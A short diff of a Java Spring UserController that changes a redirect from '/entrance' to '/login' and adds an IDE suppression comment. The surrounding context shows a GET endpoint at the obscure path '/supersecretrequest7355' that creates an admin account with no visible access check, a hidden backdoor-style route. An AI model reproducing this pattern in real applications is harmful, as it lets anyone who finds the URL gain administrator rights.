@@ -61,7 +61,8 @@ public class UserController {
     @GetMapping("/supersecretrequest7355")
     public String addAdmin() {
         userService.createAdmin();
-        return "redirect:/entrance";
+        //noinspection SpringMVCViewInspection
+        return "redirect:/login";
     }
 
 
